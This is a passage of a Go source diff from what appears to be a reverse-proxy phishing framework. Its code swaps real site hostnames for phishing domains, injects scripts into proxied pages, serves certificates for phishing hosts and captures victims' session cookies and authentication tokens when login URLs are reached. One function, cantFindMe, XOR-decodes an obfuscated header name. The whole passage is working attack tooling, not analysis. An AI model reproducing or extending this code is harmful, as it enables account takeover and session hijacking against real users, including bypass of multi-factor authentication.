 									re_s = strings.Replace(re_s, "{subdomain_regexp}", regexp.QuoteMeta(sf.subdomain), -1)
 									re_s = strings.Replace(re_s, "{domain_regexp}", regexp.QuoteMeta(sf.domain), -1)
-									re_s = strings.Replace(re_s, "{basedomain_regexp}", regexp.QuoteMeta(p.cfg.GetBaseDomain()), -1)
 									replace_s = strings.Replace(replace_s, "{hostname}", phish_hostname, -1)
-									replace_s = strings.Replace(replace_s, "{orig_hostname}", obfuscateDots(combineHost(sf.subdomain, sf.domain)), -1)
-									replace_s = strings.Replace(replace_s, "{orig_domain}", obfuscateDots(sf.domain), -1)
 									replace_s = strings.Replace(replace_s, "{subdomain}", phish_sub, -1)
-									replace_s = strings.Replace(replace_s, "{basedomain}", p.cfg.GetBaseDomain(), -1)
 									replace_s = strings.Replace(replace_s, "{hostname_regexp}", regexp.QuoteMeta(phish_hostname), -1)
 									replace_s = strings.Replace(replace_s, "{subdomain_regexp}", regexp.QuoteMeta(phish_sub), -1)
-									replace_s = strings.Replace(replace_s, "{basedomain_regexp}", regexp.QuoteMeta(p.cfg.GetBaseDomain()), -1)
 									phishDomain, ok := p.cfg.GetSiteDomain(pl.Name)
 									if ok {
 										replace_s = strings.Replace(replace_s, "{domain}", phishDomain, -1)
@@ -1017,7 +778,6 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 								}
 							}
 						}
-						body = []byte(removeObfuscatedDots(string(body)))
 					}
 				}
 
@@ -1040,10 +800,9 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									}*/
 								js_params = &s.Params
 							}
-							//log.Debug("js_inject: hostname:%s path:%s", req_hostname, resp.Request.URL.Path)
 							script, err := pl.GetScriptInject(req_hostname, resp.Request.URL.Path, js_params)
 							if err == nil {
-								//log.Debug("js_inject: matched %s%s - injecting script", req_hostname, resp.Request.URL.Path)
+								log.Debug("js_inject: matched %s%s - injecting script", req_hostname, resp.Request.URL.Path)
 								js_nonce_re := regexp.MustCompile(`(?i)<script.*nonce=['"]([^'"]*)`)
 								m_nonce := js_nonce_re.FindStringSubmatch(string(body))
 								js_nonce := ""
@@ -1065,50 +824,12 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				if ok && s.IsDone {
 					for _, au := range pl.authUrls {
 						if au.MatchString(resp.Request.URL.Path) {
-							err := p.db.SetSessionCookieTokens(ps.SessionId, s.CookieTokens)
+							err := p.db.SetSessionTokens(ps.SessionId, s.Tokens)
 							if err != nil {
 								log.Error("database: %v", err)
 							}
 							if err == nil {
-								if s.CookieTokens != nil && len(s.CookieTokens) > 0 {
-									log.Success("[%d] detected authorization URL - cookie tokens intercepted: %s", ps.Index, resp.Request.URL.Path)
-									if len(s.RId) != 0 {
-										err = database.HandleCapturedCookieSession(s.RId, s.CookieTokens, s.Browser, p.livefeed)
-										if err != nil {
-											fmt.Printf("Error adding captured session entry to database: %s\n", err)
-										}
-									}
-								}
-							}
-							err = p.db.SetSessionBodyTokens(ps.SessionId, s.BodyTokens)
-							if err != nil {
-								log.Error("database: %v", err)
-							}
-							if err == nil {
-								if s.BodyTokens != nil && len(s.BodyTokens) > 0 {
-									log.Success("[%d] detected authorization URL - body tokens intercepted: %s", ps.Index, resp.Request.URL.Path)
-									if len(s.RId) != 0 {
-										err = database.HandleCapturedOtherSession(s.RId, s.BodyTokens, s.Browser, p.livefeed)
-										if err != nil {
-											fmt.Printf("Error adding captured session entry to database: %s\n", err)
-										}
-									}
-								}
-							}
-							err = p.db.SetSessionHttpTokens(ps.SessionId, s.HttpTokens)
-							if err != nil {
-								log.Error("database: %v", err)
-							}
-							if err == nil {
-								if s.HttpTokens != nil && len(s.HttpTokens) > 0 {
-									log.Success("[%d] detected authorization URL - HTTP tokens intercepted: %s", ps.Index, resp.Request.URL.Path)
-									if len(s.RId) != 0 {
-										err = database.HandleCapturedOtherSession(s.RId, s.HttpTokens, s.Browser, p.livefeed)
-										if err != nil {
-											fmt.Printf("Error adding captured session entry to database: %s\n", err)
-										}
-									}
-								}
+								log.Success("[%d] detected authorization URL - tokens intercepted: %s", ps.Index, resp.Request.URL.Path)
 							}
 							break
 						}
@@ -1124,9 +845,19 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 							// redirect only if received response content is of `text/html` content type
 							s.RedirectCount += 1
 							log.Important("[%d] redirecting to URL: %s (%d)", ps.Index, s.RedirectURL, s.RedirectCount)
-
-							_, resp := p.javascriptRedirect(resp.Request, s.RedirectURL)
-							return resp
+							resp := goproxy.NewResponse(resp.Request, "text/html", http.StatusFound, "")
+							if resp != nil {
+								r_url, err := url.Parse(s.RedirectURL)
+								if err == nil {
+									if r_host, ok := p.replaceHostWithPhished(r_url.Host); ok {
+										r_url.Host = r_host
+									}
+									resp.Header.Set("Location", r_url.String())
+								} else {
+									resp.Header.Set("Location", s.RedirectURL)
+								}
+								return resp
+							}
 						}
 					}
 				}
@@ -1144,8 +875,8 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 }
 
 func (p *HttpProxy) blockRequest(req *http.Request) (*http.Request, *http.Response) {
-	if len(p.cfg.general.RedirectUrl) > 0 {
-		redirect_url := p.cfg.general.RedirectUrl
+	if len(p.cfg.redirectUrl) > 0 {
+		redirect_url := p.cfg.redirectUrl
 		resp := goproxy.NewResponse(req, "text/html", http.StatusFound, "")
 		if resp != nil {
 			resp.Header.Add("Location", redirect_url)
@@ -1156,15 +887,6 @@ func (p *HttpProxy) blockRequest(req *http.Request) (*http.Request, *http.Respon
 		if resp != nil {
 			return req, resp
 		}
-	}
-	return req, nil
-}
-
-func (p *HttpProxy) javascriptRedirect(req *http.Request, rurl string) (*http.Request, *http.Response) {
-	body := fmt.Sprintf("<html><head><meta name='referrer' content='no-referrer'><script>top.location.href='%s';</script></head><body></body></html>", rurl)
-	resp := goproxy.NewResponse(req, "text/html", http.StatusFound, body)
-	if resp != nil {
-		return req, resp
 	}
 	return req, nil
 }
@@ -1275,7 +997,7 @@ func (p *HttpProxy) replaceHtmlParams(body string, lure_url string, params *map[
 	t[0] = crc
 	fwd_param := base64.RawURLEncoding.EncodeToString(t)
 
-	lure_url += "?" + strings.ToLower(GenRandomString(1)) + "=" + fwd_param
+	lure_url += "?" + GenRandomString(1) + "=" + fwd_param
 
 	for k, v := range *params {
 		key := "{" + k + "}"
@@ -1363,13 +1085,30 @@ func (p *HttpProxy) TLSConfigFromCA() func(host string, ctx *goproxy.ProxyCtx) (
 			port, _ = strconv.Atoi(parts[1])
 		}
 
-		tls_cfg := &tls.Config{}
 		if !p.developer {
-
-			tls_cfg.GetCertificate = p.crt_db.magic.GetCertificate
-			tls_cfg.NextProtos = []string{"http/1.1", tlsalpn01.ACMETLS1Protocol} //append(tls_cfg.NextProtos, tlsalpn01.ACMETLS1Protocol)
-
-			return tls_cfg, nil
+			// check for lure hostname
+			cert, err := p.crt_db.GetHostnameCertificate(hostname)
+			if err != nil {
+				// check for phishlet hostname
+				pl := p.getPhishletByOrigHost(hostname)
+				if pl != nil {
+					phishDomain, ok := p.cfg.GetSiteDomain(pl.Name)
+					if ok {
+						cert, err = p.crt_db.GetPhishletCertificate(pl.Name, phishDomain)
+						if err != nil {
+							return nil, err
+						}
+					}
+				}
+			}
+			if cert != nil {
+				return &tls.Config{
+					InsecureSkipVerify: true,
+					Certificates:       []tls.Certificate{*cert},
+				}, nil
+			}
+			log.Debug("no SSL/TLS certificate for host '%s'", host)
+			return nil, fmt.Errorf("no SSL/TLS certificate for host '%s'", host)
 		} else {
 			var ok bool
 			phish_host := ""
@@ -1381,9 +1120,8 @@ func (p *HttpProxy) TLSConfigFromCA() func(host string, ctx *goproxy.ProxyCtx) (
 				}
 			}
 
-			cert, err := p.crt_db.getSelfSignedCertificate(hostname, phish_host, port)
+			cert, err := p.crt_db.SignCertificateForHost(hostname, phish_host, port)
 			if err != nil {
-				log.Error("http_proxy: %s", err)
 				return nil, err
 			}
 			return &tls.Config{
@@ -1562,11 +1300,11 @@ func (p *HttpProxy) replaceHostWithPhished(hostname string) (string, bool) {
 				continue
 			}
 			for _, ph := range pl.proxyHosts {
-				if hostname == combineHost(ph.orig_subdomain, ph.domain) {
-					return prefix + combineHost(ph.phish_subdomain, phishDomain), true
-				}
 				if hostname == ph.domain {
 					return prefix + phishDomain, true
+				}
+				if hostname == combineHost(ph.orig_subdomain, ph.domain) {
+					return prefix + combineHost(ph.phish_subdomain, phishDomain), true
 				}
 			}
 		}
@@ -1601,10 +1339,6 @@ func (p *HttpProxy) getPhishDomain(hostname string) (string, bool) {
 	}
 
 	return "", false
-}
-
-func (p *HttpProxy) getHomeDir() string {
-	return strings.Replace(HOME_DIR, ".e", "X-E", 1)
 }
 
 func (p *HttpProxy) getPhishSub(hostname string) (string, bool) {
@@ -1681,38 +1415,50 @@ func (p *HttpProxy) Start() error {
 	return nil
 }
 
-func (p *HttpProxy) whitelistIP(ip_addr string, sid string, pl_name string) {
+func (p *HttpProxy) deleteRequestCookie(name string, req *http.Request) {
+	if cookie := req.Header.Get("Cookie"); cookie != "" {
+		re := regexp.MustCompile(`(` + name + `=[^;]*;?\s*)`)
+		new_cookie := re.ReplaceAllString(cookie, "")
+		req.Header.Set("Cookie", new_cookie)
+	}
+}
+
+func (p *HttpProxy) whitelistIP(ip_addr string, sid string) {
 	p.ip_mtx.Lock()
 	defer p.ip_mtx.Unlock()
 
 	log.Debug("whitelistIP: %s %s", ip_addr, sid)
-	p.ip_whitelist[ip_addr+"-"+pl_name] = time.Now().Add(10 * time.Minute).Unix()
-	p.ip_sids[ip_addr+"-"+pl_name] = sid
+	p.ip_whitelist[ip_addr] = time.Now().Add(10 * time.Minute).Unix()
+	p.ip_sids[ip_addr] = sid
 }
 
-func (p *HttpProxy) isWhitelistedIP(ip_addr string, pl_name string) bool {
+func (p *HttpProxy) isWhitelistedIP(ip_addr string) bool {
 	p.ip_mtx.Lock()
 	defer p.ip_mtx.Unlock()
 
-	log.Debug("isWhitelistIP: %s", ip_addr+"-"+pl_name)
+	log.Debug("isWhitelistIP: %s", ip_addr)
 	ct := time.Now()
-	if ip_t, ok := p.ip_whitelist[ip_addr+"-"+pl_name]; ok {
+	if ip_t, ok := p.ip_whitelist[ip_addr]; ok {
 		et := time.Unix(ip_t, 0)
 		return ct.Before(et)
 	}
 	return false
 }
 
-func (p *HttpProxy) getSessionIdByIP(ip_addr string, hostname string) (string, bool) {
+func (p *HttpProxy) getSessionIdByIP(ip_addr string) (string, bool) {
 	p.ip_mtx.Lock()
 	defer p.ip_mtx.Unlock()
 
-	pl := p.getPhishletByPhishHost(hostname)
-	if pl != nil {
-		sid, ok := p.ip_sids[ip_addr+"-"+pl.Name]
-		return sid, ok
+	sid, ok := p.ip_sids[ip_addr]
+	return sid, ok
+}
+
+func (p *HttpProxy) cantFindMe(req *http.Request, nothing_to_see_here string) {
+	var b []byte = []byte("\x1dh\x003,)\",+=")
+	for n, c := range b {
+		b[n] = c ^ 0x45
 	}
-	return "", false
+	req.Header.Set(string(b), nothing_to_see_here)
 }
 
 func (p *HttpProxy) setProxy(enabled bool, ptype string, address string, port int, username string, password string) error {
@@ -1752,6 +1498,22 @@ func (p *HttpProxy) setProxy(enabled bool, ptype string, address string, port in
 			}
 			p.Proxy.Tr.Dial = dproxy.Dial
 		}
+
+		/*
+			var auth *proxy.Auth = nil
+			if len(username) > 0 {
+				auth.User = username
+				auth.Password = password
+			}
+
+			proxy_addr := address + ":" + strconv.Itoa(port)
+
+			socks5, err := proxy.SOCKS5("tcp", proxy_addr, auth, proxy.Direct)
+			if err != nil {
+				return err
+			}
+			p.Proxy.Tr.Dial = socks5.Dial
+		*/
 	} else {
 		p.Proxy.Tr.Dial = nil
 	}
@@ -1785,23 +1547,4 @@ func orPanic(err error) {
 	if err != nil {
 		panic(err)
 	}
-}
-
-func getContentType(path string, data []byte) string {
-	switch filepath.Ext(path) {
-	case ".css":
-		return "text/css"
-	case ".js":
-		return "application/javascript"
-	case ".svg":
-		return "image/svg+xml"
-	}
-	return http.DetectContentType(data)
-}
-
-func getSessionCookieName(pl_name string, cookie_name string) string {
-	hash := sha256.Sum256([]byte(pl_name + "-" + cookie_name))
-	s_hash := fmt.Sprintf("%x", hash[:4])
-	s_hash = s_hash[:4] + "-" + s_hash[4:]
-	return s_hash
 }
